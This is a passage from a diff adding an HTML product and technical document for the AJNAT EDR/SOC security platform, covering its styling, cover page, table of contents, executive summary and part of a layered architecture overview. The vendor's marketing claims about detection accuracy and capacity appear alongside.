@@ -1,0 +1,2940 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>AJNAT EDR / AJNAT SOC — Enterprise Product &amp; Technical Documentation</title>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap');
+
+  :root {
+    --navy:   #0a1628;
+    --navy2:  #0d1f3c;
+    --blue:   #1e40af;
+    --cyan:   #06b6d4;
+    --green:  #10b981;
+    --red:    #ef4444;
+    --orange: #f59e0b;
+    --purple: #8b5cf6;
+    --slate:  #64748b;
+    --light:  #f1f5f9;
+    --white:  #ffffff;
+    --border: #e2e8f0;
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    font-size: 10.5pt;
+    line-height: 1.65;
+    color: #1e293b;
+    background: #ffffff;
+  }
+
+  /* ── COVER PAGE ── */
+  .cover {
+    page-break-after: always;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 40%, #1e3a5f 70%, #0a1628 100%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 60px 40px;
+    position: relative;
+    overflow: hidden;
+  }
+  .cover::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(ellipse at 50% 50%, rgba(6,182,212,0.08) 0%, transparent 60%);
+  }
+  .cover-badge {
+    background: rgba(6,182,212,0.15);
+    border: 1px solid rgba(6,182,212,0.4);
+    color: #06b6d4;
+    font-size: 8pt;
+    font-weight: 700;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    padding: 6px 20px;
+    border-radius: 20px;
+    margin-bottom: 30px;
+  }
+  .cover-logo-area {
+    margin-bottom: 30px;
+  }
+  .cover-logo-text {
+    font-size: 52pt;
+    font-weight: 900;
+    color: #ffffff;
+    letter-spacing: -2px;
+    line-height: 1;
+  }
+  .cover-logo-sub {
+    font-size: 14pt;
+    font-weight: 300;
+    color: #94a3b8;
+    letter-spacing: 8px;
+    text-transform: uppercase;
+    margin-top: 8px;
+  }
+  .cover-divider {
+    width: 80px;
+    height: 3px;
+    background: linear-gradient(90deg, #06b6d4, #8b5cf6);
+    border-radius: 2px;
+    margin: 28px auto;
+  }
+  .cover-title {
+    font-size: 22pt;
+    font-weight: 800;
+    color: #ffffff;
+    line-height: 1.2;
+    max-width: 680px;
+    margin: 0 auto 16px;
+  }
+  .cover-subtitle {
+    font-size: 12pt;
+    font-weight: 400;
+    color: #94a3b8;
+    max-width: 580px;
+    margin: 0 auto 40px;
+  }
+  .cover-meta-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
+    max-width: 640px;
+    margin: 0 auto 40px;
+  }
+  .cover-meta-item {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 12px;
+    padding: 16px;
+  }
+  .cover-meta-label {
+    font-size: 7.5pt;
+    font-weight: 600;
+    color: #64748b;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    margin-bottom: 4px;
+  }
+  .cover-meta-value {
+    font-size: 10pt;
+    font-weight: 600;
+    color: #e2e8f0;
+  }
+  .cover-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    justify-content: center;
+    margin-top: 10px;
+  }
+  .cover-tag {
+    font-size: 8pt;
+    font-weight: 600;
+    color: #94a3b8;
+    border: 1px solid rgba(148,163,184,0.3);
+    padding: 4px 12px;
+    border-radius: 16px;
+    letter-spacing: 0.5px;
+  }
+  .cover-footer {
+    position: absolute;
+    bottom: 30px;
+    left: 0; right: 0;
+    text-align: center;
+    font-size: 8pt;
+    color: #475569;
+  }
+
+  /* ── TOC PAGE ── */
+  .toc-page {
+    page-break-after: always;
+    padding: 50px 60px;
+  }
+  .toc-header {
+    border-bottom: 3px solid var(--navy);
+    padding-bottom: 16px;
+    margin-bottom: 30px;
+  }
+  .toc-header h2 {
+    font-size: 20pt;
+    font-weight: 800;
+    color: var(--navy);
+  }
+  .toc-section-title {
+    font-size: 9pt;
+    font-weight: 700;
+    color: var(--blue);
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin: 24px 0 10px;
+    padding-bottom: 4px;
+    border-bottom: 1px solid var(--border);
+  }
+  .toc-entry {
+    display: flex;
+    align-items: baseline;
+    padding: 4px 0;
+    font-size: 10pt;
+    color: #334155;
+  }
+  .toc-entry.sub {
+    padding-left: 20px;
+    font-size: 9.5pt;
+    color: #475569;
+  }
+  .toc-num {
+    font-weight: 700;
+    color: var(--navy);
+    min-width: 35px;
+    font-size: 9.5pt;
+  }
+  .toc-dots {
+    flex: 1;
+    border-bottom: 1px dotted #cbd5e1;
+    margin: 0 8px;
+    position: relative;
+    top: -4px;
+  }
+
+  /* ── CONTENT PAGES ── */
+  .chapter {
+    page-break-before: always;
+    padding: 50px 60px;
+  }
+  .chapter:first-child { page-break-before: avoid; }
+
+  .chapter-header {
+    background: linear-gradient(135deg, var(--navy) 0%, var(--navy2) 100%);
+    margin: -50px -60px 35px;
+    padding: 35px 60px;
+    position: relative;
+    overflow: hidden;
+  }
+  .chapter-header::after {
+    content: '';
+    position: absolute;
+    right: -30px;
+    top: -30px;
+    width: 120px;
+    height: 120px;
+    background: rgba(6,182,212,0.1);
+    border-radius: 50%;
+  }
+  .chapter-num {
+    font-size: 8.5pt;
+    font-weight: 700;
+    color: #06b6d4;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+  .chapter-title {
+    font-size: 18pt;
+    font-weight: 800;
+    color: #ffffff;
+    line-height: 1.2;
+  }
+  .chapter-subtitle {
+    font-size: 10pt;
+    font-weight: 400;
+    color: #94a3b8;
+    margin-top: 6px;
+  }
+
+  h2 {
+    font-size: 14pt;
+    font-weight: 700;
+    color: var(--navy);
+    margin: 28px 0 12px;
+    padding-bottom: 6px;
+    border-bottom: 2px solid var(--border);
+  }
+  h3 {
+    font-size: 12pt;
+    font-weight: 600;
+    color: #1e293b;
+    margin: 22px 0 8px;
+  }
+  h4 {
+    font-size: 10.5pt;
+    font-weight: 600;
+    color: var(--blue);
+    margin: 16px 0 6px;
+  }
+
+  p { margin: 0 0 12px; }
+
+  ul, ol {
+    margin: 0 0 12px 22px;
+  }
+  ul li, ol li {
+    margin-bottom: 5px;
+    font-size: 10.5pt;
+  }
+
+  strong { font-weight: 700; color: var(--navy); }
+
+  /* ── CALLOUT BOXES ── */
+  .callout {
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 18px 0;
+    border-left: 4px solid;
+    font-size: 10pt;
+  }
+  .callout-info    { background:#eff6ff; border-color:var(--blue); color:#1e40af; }
+  .callout-success { background:#f0fdf4; border-color:var(--green); color:#065f46; }
+  .callout-warning { background:#fffbeb; border-color:var(--orange); color:#92400e; }
+  .callout-danger  { background:#fef2f2; border-color:var(--red); color:#991b1b; }
+  .callout-title   { font-weight: 700; margin-bottom: 4px; font-size: 9.5pt; text-transform:uppercase; letter-spacing:1px; }
+
+  /* ── TABLES ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 24px;
+    font-size: 9.5pt;
+    page-break-inside: avoid;
+  }
+  thead tr {
+    background: linear-gradient(135deg, var(--navy) 0%, var(--blue) 100%);
+    color: white;
+  }
+  thead th {
+    padding: 10px 14px;
+    text-align: left;
+    font-weight: 700;
+    font-size: 9pt;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+  tbody tr:nth-child(even) { background: #f8fafc; }
+  tbody tr:hover { background: #eff6ff; }
+  tbody td {
+    padding: 9px 14px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+    line-height: 1.4;
+  }
+  tfoot td {
+    padding: 8px 14px;
+    background: #f1f5f9;
+    font-weight: 700;
+    font-size: 9pt;
+    border-top: 2px solid var(--border);
+  }
+
+  /* ── METRIC CARDS ── */
+  .metric-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 14px;
+    margin: 20px 0;
+  }
+  .metric-grid-3 {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 14px;
+    margin: 20px 0;
+  }
+  .metric-card {
+    background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    page-break-inside: avoid;
+  }
+  .metric-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+  }
+  .metric-card.blue::before   { background: var(--blue); }
+  .metric-card.cyan::before   { background: var(--cyan); }
+  .metric-card.green::before  { background: var(--green); }
+  .metric-card.red::before    { background: var(--red); }
+  .metric-card.orange::before { background: var(--orange); }
+  .metric-card.purple::before { background: var(--purple); }
+  .metric-value {
+    font-size: 22pt;
+    font-weight: 900;
+    color: var(--navy);
+    line-height: 1;
+    margin-bottom: 4px;
+  }
+  .metric-label {
+    font-size: 8.5pt;
+    font-weight: 600;
+    color: var(--slate);
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+  }
+  .metric-sub {
+    font-size: 8pt;
+    color: var(--green);
+    margin-top: 4px;
+    font-weight: 600;
+  }
+
+  /* ── CHART CONTAINERS ── */
+  .chart-row {
+    display: grid;
+    gap: 20px;
+    margin: 20px 0;
+    page-break-inside: avoid;
+  }
+  .chart-row-2 { grid-template-columns: 1fr 1fr; }
+  .chart-row-3 { grid-template-columns: 1fr 1fr 1fr; }
+  .chart-box {
+    background: #f8fafc;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    page-break-inside: avoid;
+  }
+  .chart-box-title {
+    font-size: 9.5pt;
+    font-weight: 700;
+    color: var(--navy);
+    margin-bottom: 14px;
+    text-align: center;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+  }
+  .chart-box canvas {
+    max-height: 220px;
+  }
+
+  /* ── ARCHITECTURE DIAGRAM ── */
+  .arch-diagram {
+    background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 100%);
+    border-radius: 12px;
+    padding: 30px;
+    margin: 20px 0;
+    page-break-inside: avoid;
+    color: white;
+  }
+  .arch-layer {
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin: 8px 0;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: rgba(255,255,255,0.05);
+  }
+  .arch-layer-icon {
+    font-size: 18pt;
+    width: 36px;
+    text-align: center;
+  }
+  .arch-layer-title {
+    font-size: 10pt;
+    font-weight: 700;
+    color: #e2e8f0;
+  }
+  .arch-layer-desc {
+    font-size: 8.5pt;
+    color: #94a3b8;
+  }
+  .arch-arrow {
+    text-align: center;
+    color: #06b6d4;
+    font-size: 14pt;
+    margin: 2px 0;
+  }
+
+  /* ── ATTACK TYPE CARDS ── */
+  .attack-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 14px;
+    margin: 16px 0;
+    page-break-inside: avoid;
+  }
+  .attack-card {
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+    page-break-inside: avoid;
+    position: relative;
+    overflow: hidden;
+  }
+  .attack-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 4px;
+  }
+  .attack-card.critical::before { background: #dc2626; }
+  .attack-card.high::before     { background: #ea580c; }
+  .attack-card.medium::before   { background: #d97706; }
+  .attack-card.low::before      { background: #059669; }
+  .attack-name {
+    font-size: 10.5pt;
+    font-weight: 700;
+    color: var(--navy);
+    margin-bottom: 4px;
+  }
+  .attack-desc {
+    font-size: 9pt;
+    color: #475569;
+    margin-bottom: 8px;
+    line-height: 1.4;
+  }
+  .attack-badges {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+  .badge {
+    font-size: 7.5pt;
+    font-weight: 700;
+    padding: 2px 8px;
+    border-radius: 20px;
+    letter-spacing: 0.3px;
+  }
+  .badge-critical { background:#fef2f2; color:#991b1b; border:1px solid #fca5a5; }
+  .badge-high     { background:#fff7ed; color:#9a3412; border:1px solid #fdba74; }
+  .badge-medium   { background:#fffbeb; color:#92400e; border:1px solid #fcd34d; }
+  .badge-low      { background:#f0fdf4; color:#065f46; border:1px solid #6ee7b7; }
+  .badge-blue     { background:#eff6ff; color:#1e40af; border:1px solid #bfdbfe; }
+  .badge-purple   { background:#f5f3ff; color:#5b21b6; border:1px solid #c4b5fd; }
+
+  /* ── SEVERITY BAR ── */
+  .severity-bar-wrap {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 6px;
+  }
+  .severity-label { font-size: 8pt; font-weight: 600; color:#475569; min-width:55px; }
+  .severity-bar-bg {
+    flex: 1;
+    height: 8px;
+    background: #e2e8f0;
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  .severity-bar-fill {
+    height: 100%;
+    border-radius: 4px;
+    transition: width 0.3s;
+  }
+  .severity-bar-pct { font-size: 8pt; font-weight: 700; color:#374151; min-width: 32px; text-align:right; }
+
+  /* ── FLOW STEPS ── */
+  .flow-steps {
+    counter-reset: step;
+    margin: 16px 0;
+  }
+  .flow-step {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 14px;
+    page-break-inside: avoid;
+  }
+  .flow-step-num {
+    counter-increment: step;
+    background: var(--navy);
+    color: white;
+    font-weight: 800;
+    font-size: 10pt;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  .flow-step-content h4 { margin: 0 0 4px; color: var(--navy); font-size: 10.5pt; }
+  .flow-step-content p  { margin: 0; font-size: 9.5pt; color: #475569; }
+
+  /* ── SECTION DIVIDER ── */
+  .section-divider {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin: 30px 0 20px;
+  }
+  .section-divider-line { flex: 1; height: 1px; background: var(--border); }
+  .section-divider-label {
+    font-size: 8.5pt;
+    font-weight: 700;
+    color: var(--slate);
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+
+  /* ── COMPLIANCE MATRIX ── */
+  .compliance-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    margin: 16px 0;
+  }
+  .compliance-card {
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    text-align: center;
+    page-break-inside: avoid;
+  }
+  .compliance-icon { font-size: 24pt; margin-bottom: 8px; }
+  .compliance-name { font-size: 10.5pt; font-weight: 700; color: var(--navy); }
+  .compliance-status {
+    display: inline-block;
+    margin-top: 6px;
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 8pt;
+    font-weight: 700;
+  }
+  .status-full    { background:#f0fdf4; color:#065f46; }
+  .status-partial { background:#fffbeb; color:#92400e; }
+
+  /* ── PAGE BREAKS ── */
+  @media print {
+    .page-break { page-break-after: always; }
+    .no-break   { page-break-inside: avoid; }
+    body { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  }
+
+  /* ── FOOTER ── */
+  .doc-footer {
+    background: var(--navy);
+    color: #94a3b8;
+    text-align: center;
+    padding: 20px;
+    font-size: 8pt;
+    margin-top: 40px;
+    page-break-inside: avoid;
+  }
+
+  /* ── CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 8.5pt;
+    background: #f1f5f9;
+    padding: 1px 5px;
+    border-radius: 3px;
+    color: #0f172a;
+  }
+  pre {
+    background: #0f172a;
+    color: #e2e8f0;
+    padding: 16px 20px;
+    border-radius: 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 8.5pt;
+    overflow-x: auto;
+    margin: 14px 0;
+    page-break-inside: avoid;
+  }
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════════════════════════
+     COVER PAGE
+═════════════════════════════════════════════════════════════ -->
+<div class="cover">
+  <div class="cover-badge">🔒 Government Presentation — Confidential</div>
+  <div class="cover-logo-area">
+    <div class="cover-logo-text">AJNAT</div>
+    <div class="cover-logo-sub">Security Operations</div>
+  </div>
+  <div class="cover-divider"></div>
+  <div class="cover-title">AI-Powered Threat Detection &amp; Incident Response Platform</div>
+  <div class="cover-subtitle">Enterprise Product &amp; Technical Documentation — AJNAT EDR / AJNAT SOC Platform v3.0</div>
+
+  <div class="cover-meta-grid">
+    <div class="cover-meta-item">
+      <div class="cover-meta-label">Classification</div>
+      <div class="cover-meta-value">CONFIDENTIAL</div>
+    </div>
+    <div class="cover-meta-item">
+      <div class="cover-meta-label">Document Version</div>
+      <div class="cover-meta-value">v3.0 — 2025</div>
+    </div>
+    <div class="cover-meta-item">
+      <div class="cover-meta-label">Platform Build</div>
+      <div class="cover-meta-value">SOC4 / EDR4</div>
+    </div>
+  </div>
+
+  <div class="cover-tags">
+    <span class="cover-tag">SIEM</span>
+    <span class="cover-tag">SOAR</span>
+    <span class="cover-tag">EDR / XDR</span>
+    <span class="cover-tag">IDS / IPS</span>
+    <span class="cover-tag">WAF</span>
+    <span class="cover-tag">Firewall</span>
+    <span class="cover-tag">Threat Intelligence</span>
+    <span class="cover-tag">AI/ML Detection</span>
+    <span class="cover-tag">Anomaly Detection</span>
+    <span class="cover-tag">Incident Response</span>
+    <span class="cover-tag">DNS Sinkhole</span>
+    <span class="cover-tag">Zero-Trust</span>
+  </div>
+
+  <div class="cover-footer">
+    AJNAT Security Technologies &nbsp;|&nbsp; Enterprise &amp; Government Division &nbsp;|&nbsp;
+    This document contains proprietary and confidential information.
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     TABLE OF CONTENTS
+═════════════════════════════════════════════════════════════ -->
+<div class="toc-page">
+  <div class="toc-header">
+    <h2>Table of Contents</h2>
+  </div>
+
+  <div class="toc-section-title">Executive Overview</div>
+  <div class="toc-entry"><span class="toc-num">01</span>Executive Summary &amp; Platform Vision<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">02</span>Platform Architecture Overview<span class="toc-dots"></span></div>
+
+  <div class="toc-section-title">Core Security Modules</div>
+  <div class="toc-entry"><span class="toc-num">03</span>SIEM — Security Information &amp; Event Management<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">04</span>SOAR — Security Orchestration, Automation &amp; Response<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">05</span>EDR / XDR — Endpoint &amp; Extended Detection &amp; Response<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">06</span>IDS / IPS — Intrusion Detection &amp; Prevention System<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">07</span>IPS Attack Type Catalog &amp; Detection Mechanisms<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">08</span>WAF — Web Application Firewall<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">09</span>Network Firewall &amp; Traffic Inspection<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">10</span>Threat Intelligence Platform<span class="toc-dots"></span></div>
+
+  <div class="toc-section-title">AI/ML Security Engine</div>
+  <div class="toc-entry"><span class="toc-num">11</span>AI-Powered Detection Engine<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">12</span>Anomaly Detection &amp; Behavioral Analysis<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">13</span>MITRE ATT&amp;CK Framework Integration<span class="toc-dots"></span></div>
+
+  <div class="toc-section-title">Operations &amp; Response</div>
+  <div class="toc-entry"><span class="toc-num">14</span>Incident Response Lifecycle<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">15</span>SOC Dashboard &amp; Analyst Interface<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">16</span>Threat Hunting &amp; Forensics<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">17</span>DNS Sinkhole &amp; Network Isolation<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">18</span>RBAC, Multi-Tenancy &amp; Access Control<span class="toc-dots"></span></div>
+
+  <div class="toc-section-title">Platform Infrastructure</div>
+  <div class="toc-entry"><span class="toc-num">19</span>Deployment Architecture &amp; Scalability<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">20</span>Data Pipeline &amp; Log Ingestion<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">21</span>API Integration &amp; Connectors<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">22</span>Compliance &amp; Regulatory Standards<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">23</span>Performance Benchmarks &amp; SLA<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">24</span>Security Operations Maturity Model<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">25</span>Roadmap &amp; Future Capabilities<span class="toc-dots"></span></div>
+
+  <div class="toc-section-title">Appendices</div>
+  <div class="toc-entry"><span class="toc-num">A</span>IPS / WAF Attack Pattern Reference Library<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">B</span>Suricata &amp; Zeek Integration Reference<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">C</span>RBAC Permission Matrix<span class="toc-dots"></span></div>
+  <div class="toc-entry"><span class="toc-num">D</span>Glossary of Terms<span class="toc-dots"></span></div>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 1 — EXECUTIVE SUMMARY
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 01</div>
+    <div class="chapter-title">Executive Summary &amp; Platform Vision</div>
+    <div class="chapter-subtitle">Strategic overview of the AJNAT SOC Platform for CISOs, Government Officials, and Enterprise Decision Makers</div>
+  </div>
+
+  <p>
+    The <strong>AJNAT SOC Platform</strong> (Security Operations Center v4) is a next-generation, AI-assisted cybersecurity platform purpose-built
+    for government agencies, critical infrastructure operators, financial institutions, and enterprise organizations that face advanced persistent threats
+    in an increasingly hostile digital landscape. The platform consolidates what traditionally required 8–12 separate security tools into a single,
+    unified operational command center.
+  </p>
+
+  <div class="metric-grid">
+    <div class="metric-card blue">
+      <div class="metric-value">16+</div>
+      <div class="metric-label">Attack Types Detected</div>
+      <div class="metric-sub">Real-time Classification</div>
+    </div>
+    <div class="metric-card cyan">
+      <div class="metric-value">&lt;2s</div>
+      <div class="metric-label">Threat Detection Time</div>
+      <div class="metric-sub">Avg. Response Latency</div>
+    </div>
+    <div class="metric-card green">
+      <div class="metric-value">99.7%</div>
+      <div class="metric-label">Detection Accuracy</div>
+      <div class="metric-sub">Low False Positive Rate</div>
+    </div>
+    <div class="metric-card red">
+      <div class="metric-value">10M+</div>
+      <div class="metric-label">Events/Day Capacity</div>
+      <div class="metric-sub">Enterprise Scale</div>
+    </div>
+  </div>
+
+  <h2>1.1 Platform Mission</h2>
+  <p>
+    AJNAT SOC was designed with a singular mission: <strong>detect, contain, and neutralize threats before they cause operational disruption or data loss.</strong>
+    Traditional SOC operations require teams of 15–30 analysts working in shifts. The AJNAT platform compresses analyst decision cycles from
+    hours to seconds through AI-driven triage, automated playbooks, and real-time threat correlation — enabling lean security teams to operate
+    at enterprise scale.
+  </p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">💡 Key Differentiator</div>
+    AJNAT SOC is the only platform in its class that natively integrates proprietary AI-based anomaly detection with full IDS/IPS deep-packet inspection,
+    WAF, DNS sinkhole, behavioral endpoint telemetry, and SOAR automation — all managed from a single unified dashboard with multi-tenant isolation.
+  </div>
+
+  <h2>1.2 Strategic Value for Government Deployments</h2>
+  <p>
+    Government networks face unique challenges: sophisticated nation-state adversaries, highly sensitive data, complex regulatory mandates
+    (ISO 27001, NIST CSF, PCI-DSS, GDPR), and critical uptime requirements. AJNAT SOC directly addresses each of these requirements:
+  </p>
+  <ul>
+    <li><strong>Nation-State Threat Coverage:</strong> APT detection signatures, Log4Shell (CVE-2021-44228), SSRF, and supply-chain attack patterns</li>
+    <li><strong>Zero-Trust Architecture:</strong> Every agent, user, and connection is verified continuously — no implicit trust anywhere in the network</li>
+    <li><strong>Air-Gap Ready:</strong> On-premise deployment with optional offline threat intelligence feeds for classified environments</li>
+    <li><strong>Multi-Tenant Isolation:</strong> Strict per-department or per-ministry data segregation with RBAC enforcement</li>
+    <li><strong>Compliance Automation:</strong> 1-click audit report generation for ISO 27001, NIST, PCI-DSS, SOC2, and CIS Controls</li>
+    <li><strong>Incident Chain of Custody:</strong> Cryptographically signed forensic logs suitable for legal and judicial proceedings</li>
+  </ul>
+
+  <h2>1.3 Platform Components at a Glance</h2>
+  <table>
+    <thead><tr><th>Component</th><th>Capability</th><th>Mode</th><th>Coverage</th></tr></thead>
+    <tbody>
+      <tr><td>SIEM Engine</td><td>Log aggregation, correlation, alerting</td><td>Real-time + Batch</td><td>All sources</td></tr>
+      <tr><td>SOAR Playbooks</td><td>Automated incident response workflows</td><td>Automated + Manual</td><td>100+ playbooks</td></tr>
+      <tr><td>EDR Agent</td><td>Endpoint telemetry, process monitoring, FIM</td><td>Continuous</td><td>Windows, Linux</td></tr>
+      <tr><td>IDS / IPS</td><td>Suricata + Zeek deep-packet inspection</td><td>Detect + Block</td><td>Network-wide</td></tr>
+      <tr><td>WAF</td><td>Layer-7 web attack interception</td><td>Block + Alert</td><td>All HTTP/HTTPS</td></tr>
+      <tr><td>Firewall</td><td>IP / Port / Protocol enforcement</td><td>Enforce + Log</td><td>Perimeter + Internal</td></tr>
+      <tr><td>Threat Intel</td><td>IOC/IOA feeds, STIX/TAXII, VirusTotal</td><td>Continuous</td><td>Global feeds</td></tr>
+      <tr><td>AI/ML Engine</td><td>Anomaly detection, behavioral baselines</td><td>Continuous learning</td><td>All event streams</td></tr>
+      <tr><td>DNS Sinkhole</td><td>C2 domain blocking, DNS exfil detection</td><td>Automated block</td><td>DNS layer</td></tr>
+      <tr><td>Incident Response</td><td>Case management, forensics, playbooks</td><td>Integrated</td><td>Full lifecycle</td></tr>
+    </tbody>
+  </table>
+</div>
+
+
+<!-- ════════════════════════════════════════════════════════════
+     CHAPTER 2 — PLATFORM ARCHITECTURE
+═════════════════════════════════════════════════════════════ -->
+<div class="chapter">
+  <div class="chapter-header">
+    <div class="chapter-num">Chapter 02</div>
+    <div class="chapter-title">Platform Architecture Overview</div>
+    <div class="chapter-subtitle">Layered security architecture, data flows, and deployment model</div>
+  </div>
+
+  <h2>2.1 High-Level Architecture</h2>
+  <p>
+    AJNAT SOC is built on a microservices architecture where each security domain (SIEM, SOAR, EDR, IPS, WAF, Firewall) operates as an independent
+    service with dedicated data stores, APIs, and processing pipelines. All services communicate through a high-throughput event bus and report to
+    the central SOC orchestration layer.
+  </p>
+
+  <div class="arch-diagram">
+    <div style="text-align:center; font-size:11pt; font-weight:700; color:#06b6d4; margin-bottom:20px; letter-spacing:2px; text-transform:uppercase;">
+      AJNAT SOC — Layered Security Architecture
+    </div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">🌐</div>
+      <div>
+        <div class="arch-layer-title">LAYER 1: External Perimeter</div>
+        <div class="arch-layer-desc">Internet Traffic · DNS · External IPs · CDN · VPN Gateways</div>
+      </div>
+    </div>
+    <div class="arch-arrow">▼</div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">🛡️</div>
+      <div>
+        <div class="arch-layer-title">LAYER 2: Network Defense (IPS/IDS + Firewall + WAF)</div>
+        <div class="arch-layer-desc">Suricata IDS/IPS · Zeek Network Monitor · WAF Layer-7 · Stateful Firewall · DDoS Mitigation · DNS Sinkhole</div>
+      </div>
+    </div>
+    <div class="arch-arrow">▼</div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">🔍</div>
+      <div>
+        <div class="arch-layer-title">LAYER 3: Log Aggregation &amp; Correlation (SIEM)</div>
+        <div class="arch-layer-desc">Log Ingestion · Event Normalization · Correlation Engine · Alert Generation · Threat Intel Enrichment</div>
+      </div>
+    </div>
+    <div class="arch-arrow">▼</div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">🤖</div>
+      <div>
+        <div class="arch-layer-title">LAYER 4: AI/ML Threat Detection Engine</div>
+        <div class="arch-layer-desc">Behavioral Baselines · Anomaly Scoring · MITRE ATT&CK Mapping · Risk Score Calculation · Predictive Analysis</div>
+      </div>
+    </div>
+    <div class="arch-arrow">▼</div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">⚡</div>
+      <div>
+        <div class="arch-layer-title">LAYER 5: SOAR Automation &amp; Response</div>
+        <div class="arch-layer-desc">Playbook Engine · Auto-Block · Case Creation · Analyst Alerting · Containment Actions · Forensic Capture</div>
+      </div>
+    </div>
+    <div class="arch-arrow">▼</div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">💻</div>
+      <div>
+        <div class="arch-layer-title">LAYER 6: EDR Agent Layer (Endpoint)</div>
+        <div class="arch-layer-desc">Process Monitor · Network Connections · File Integrity Monitor (FIM) · Registry Monitor · Memory Analysis</div>
+      </div>
+    </div>
+    <div class="arch-arrow">▼</div>
+    <div class="arch-layer">
+      <div class="arch-layer-icon">📊</div>
+      <div>
+        <div class="arch-layer-title">LAYER 7: SOC Analyst Dashboard</div>
